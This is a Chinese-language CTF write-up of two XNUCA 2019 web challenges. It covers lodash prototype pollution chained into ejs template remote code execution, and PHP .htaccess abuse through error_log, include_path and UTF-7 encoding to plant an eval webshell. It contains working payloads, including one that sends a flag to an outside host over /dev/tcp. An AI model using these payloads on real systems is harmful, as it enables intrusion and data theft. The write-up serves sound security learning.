> 原文链接: https://www.anquanke.com//post/id/185377 


# XNUCA 2019 Qualifier的两个web题目writeup


                                阅读量   
                                **395722**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">9</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t01e253fff58bf5d4c3.jpg)](https://p4.ssl.qhimg.com/t01e253fff58bf5d4c3.jpg)

> 上个周末打了一下XNUCA，可以说这是打CTF以来难度最高的一个比赛，全场交的flag不到100个也是十分真实，膜精心准备这次比赛的NESE的大师傅们。这里贴一下我们队（Security_Union_Of_SEU）做出来的两个web题目的writeup与题目分析。

## HardJS

### <a class="reference-link" name="%E6%88%91%E4%BB%AC%E7%9A%84%E8%A7%A3%E6%B3%95"></a>我们的解法

拿到一个nodejs项目的源码进行审计，第一步便是运行`npm audit` ，可以看到依赖项的漏洞情况。

[![](https://res.cloudinary.com/durtftgrv/image/upload/v1567017506/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%882.33.58_k7scsn.png)](https://res.cloudinary.com/durtftgrv/image/upload/v1567017506/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%882.33.58_k7scsn.png)

可以看到依赖项`lodash`存在原型链污染漏洞，即`CVE-2019-10744`.

我们查看一下项目的js源码，看看哪里调用了lodash.在查看消息的请求处理中我们可以看到当消息数量大于5时将会调用`lodash.defaultsDeep`来合并消息

[![](https://res.cloudinary.com/durtftgrv/image/upload/v1567017747/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%882.42.08_tjlghj.png)](https://res.cloudinary.com/durtftgrv/image/upload/v1567017747/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%882.42.08_tjlghj.png)

根据`CVE-2019-10744`的信息，我们知道我们只需要有消息为

```
`{`"type":"test","content":`{`"prototype":`{`"constructor":`{`"a":"b"`}``}``}``}`
```

在合并时便会在`Object`上附加`a=b`这样一个属性，任意不存在a属性的原型为Object的对象在访问其`a`属性时均会获取到`b`属性。那么这个污染究竟会起到什么样的效果？

查看项目源码，可以知道该项目使用`ejs`库作为模版引擎，众所周知`ejs`作为一个模版引擎肯定少不了类似`eval`的操作用于解析一些数据。因此我们便可以去跟一下ejs的实现看看哪里有潜在的可以收到原型链污染的调用，这里我们可以找到两处可用的地方

#### <a class="reference-link" name="pollution%20one"></a>pollution one

[![](https://res.cloudinary.com/durtftgrv/image/upload/v1567018177/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%882.49.19_uhwvvr.png)](https://res.cloudinary.com/durtftgrv/image/upload/v1567018177/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%882.49.19_uhwvvr.png)

在577行可以看到很大的一片调用全是为了动态拼接一个js语句，这里我们可以注意到当`opts`存在属性`outputFunctionName`时,该属性`outputFunctionName`便会被直接拼接到这段js中。

往下跟一下可以看到这段js的具体调用位置

[![](https://res.cloudinary.com/durtftgrv/image/upload/v1567018436/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%882.53.42_nvsfjo.png)](https://res.cloudinary.com/durtftgrv/image/upload/v1567018436/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%882.53.42_nvsfjo.png)

[![](https://res.cloudinary.com/durtftgrv/image/upload/v1567018509/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%882.54.52_nyndle.png)](https://res.cloudinary.com/durtftgrv/image/upload/v1567018509/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%882.54.52_nyndle.png)

[![](https://res.cloudinary.com/durtftgrv/image/upload/v1567018384/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%882.52.42_ypo8ns.png)](https://res.cloudinary.com/durtftgrv/image/upload/v1567018384/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%882.52.42_ypo8ns.png)

可以看到这段代码最后生成了一个动态的函数，且源码中正含有上述的`append`.所以我们的思路就很清晰了，只要覆盖了`opts.outputFunctionName`即可触发模版编译处的RCE.

最后我们的payload如下：

```
`{`"type":"mmp","content":`{`"constructor":`{`"prototype":
`{`"outputFunctionName":"a=1;process.mainModule.require('child_process').exec('bash -c "echo $FLAG&gt;/dev/tcp/xxxxx/xx"')//"`}``}``}``}`
```

只要提交这样的信息并触发合并操作，访问任意页面即可将flag发送到我们的后端。

#### <a class="reference-link" name="pollution%20two"></a>pollution two

除了这里的`outputFunctionName`外我们也可以覆盖`opts.escapeFunction`来实现RCE，具体源码关键点对应如下

[![](https://res.cloudinary.com/durtftgrv/image/upload/v1567018846/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%883.00.33_jahw5k.png)](https://res.cloudinary.com/durtftgrv/image/upload/v1567018846/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%883.00.33_jahw5k.png)

[![](https://res.cloudinary.com/durtftgrv/image/upload/v1567018915/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%883.01.44_rhgtkj.png)](https://res.cloudinary.com/durtftgrv/image/upload/v1567018915/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%883.01.44_rhgtkj.png)

### <a class="reference-link" name="%E9%A2%84%E6%9C%9F%E8%A7%A3"></a>预期解

赛后看了NESE大佬的官方writeup,则利用了前端和后端两个原型链污染的点，后端原型链污染用于绕过登录验证越权登录admin,覆盖`login`与`userid`即可

[![](https://res.cloudinary.com/durtftgrv/image/upload/v1567019105/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%883.04.53_zi1rje.png)](https://res.cloudinary.com/durtftgrv/image/upload/v1567019105/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%883.04.53_zi1rje.png)

而前端的原型链污染则是由于调用了`$.extend`方法

[![](https://res.cloudinary.com/durtftgrv/image/upload/v1567019227/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%883.06.53_ftongv.png)](https://res.cloudinary.com/durtftgrv/image/upload/v1567019227/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%883.06.53_ftongv.png)

所有的消息都被加入了no-js，我们再看看页面是怎么渲染的

[![](https://res.cloudinary.com/durtftgrv/image/upload/v1567046276/blog/QQ20190829-0_txkv7i.jpg)](https://res.cloudinary.com/durtftgrv/image/upload/v1567046276/blog/QQ20190829-0_txkv7i.jpg)

Header/notice/wiki/button/message的地方都处在沙箱中，无法XSS，我们再看看页面

[![](https://res.cloudinary.com/durtftgrv/image/upload/v1567046527/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%8810.40.21_w1f58y.png)](https://res.cloudinary.com/durtftgrv/image/upload/v1567046527/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%8810.40.21_w1f58y.png)

可以看到我们只要通过原型链污染添加logger属性，即可覆盖logger的内容从而导致XSS。为了打到flag只需要让页面跳转到一个我们设置的伪造的登录窗口即可。

这道题目预期解将前后端的原型链污染结合利用，可以说是十分精妙的一道题目。



## ezPHP

源码很简单(感觉越简单的源码越不好搞)，一个写文件的功能且只能写文件名为`[a-z.]*` 的文件，且文件内容存在黑名单过滤，并且结尾被加上了一行，这就导致我们无法直接写入`.htaccess`里面`auto_prepend_file`等php_value。

### <a class="reference-link" name="%E6%88%91%E4%BB%AC%E7%9A%84%E8%A7%A3%E6%B3%95"></a>我们的解法

经测试，最后一行导致的`.htaccess`报错的问题可以通过`# `来解决。

该文件中有一处`include('fl3g,php')`,该文件名不能通过正则匹配所以我们没办法直接利用该文件来getshell。那么还有什么`.htaacess` 的选项可以利用？

翻一下php的官方文档[php.ini配置选项列表](https://www.php.net/manual/zh/ini.list.php)，查找所有可修改范围为`PHP_INI_ALL`即`PHP_INI_PERDIR`的配置项，我们可以注意到这样一个选项`include_path`.

[![](https://res.cloudinary.com/durtftgrv/image/upload/v1567047371/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%8810.55.54_xb4td6.png)](https://res.cloudinary.com/durtftgrv/image/upload/v1567047371/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%8810.55.54_xb4td6.png)

因此只要控制`include_path`便可以使这里include进来的`fl3g.php`可以是任意目录下的某个文件，那么怎样才能控制`fl3g.php`的内容?查找所有php log相关的功能可以看到`error_log`这一选项

[![](https://res.cloudinary.com/durtftgrv/image/upload/v1567047546/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%8810.58.31_zzuevv.png)](https://res.cloudinary.com/durtftgrv/image/upload/v1567047546/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%8810.58.31_zzuevv.png)

所以我们的思路便很清晰了：利用error_log写入log文件到`/tmp/fl3g.php`，再设置`include_path=/tmp`即可让index.php能够包含我们想要的文件。这里的报错可以通过设置`include_path`到一个不存在的文件夹即可触发包含时的报错，且include_path的值也会被输出到屏幕上。

然而很不幸的是error_log的内容默认是`htmlentities`的,我们无法插入类似`&lt;?php phpinfo();?&gt;`的payload。那么怎么才能绕过这里的转义？

查找最近的比赛我们可以发现一篇writeup[Insomnihack 2019 I33t-hoster](//github.com/mdsnins/ctf-writeups/blob/master/2019/Insomnihack%202019/l33t-hoster/l33t-hoster.md))

[![](https://res.cloudinary.com/durtftgrv/image/upload/v1567047922/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%8811.05.09_hvkhnw.png)](https://res.cloudinary.com/durtftgrv/image/upload/v1567047922/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%8811.05.09_hvkhnw.png)

这便给了我们启示可以通过设置编码来绕过限制从而getshell.

因此最后的攻击方法如下：
- Step1 写入`.htaccess` error_log相关的配置
```
php_value include_path "/tmp/xx/+ADw?php die(eval($_GET[2]))+ADs +AF8AXw-halt+AF8-compiler()+ADs"
php_value error_reporting 32767
php_value error_log /tmp/fl3g.php
#
```
- Step2 访问index.php留下error_log
- Step3 写入.htaccess新的配置
```
php_value zend.multibyte 1
php_value zend.script_encoding "UTF-7"
php_value include_path "/tmp"
#
```
- Step4 再访问一次`index.php?2=evilcode`即可getshell.
### <a class="reference-link" name="%E5%85%B6%E4%BB%96%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3"></a>其他非预期解

赛后得知我们的解法是全场唯一的正解，此外还存在两个非预期

#### <a class="reference-link" name="%E9%9D%9E%E9%A2%84%E6%9C%9F1"></a>非预期1

设置pcre的一些选项可以导致文件名判断失效，从而直接写入`fl3g.php`

```
php_value pcre.backtrack_limit 0
php_value pcre.jit 0
```

### <a class="reference-link" name="%E9%9D%9E%E9%A2%84%E6%9C%9F2"></a>非预期2

只能说这个非预期为啥我没有想到

```
php_value auto_prepend_fi
le ".htaccess"
# &lt;?php phpinfo();?&gt;
```



## 总结

以上便是我们这次XNUCA web部分的writeup，质量非常高的一场比赛，感谢NESE的大佬们。希望国内能多一些这样质量高的CTF，少一些诸如某空间之类的垃圾比赛，也希望CTF圈选手们以后都能`洁身自好`杜绝py现象。
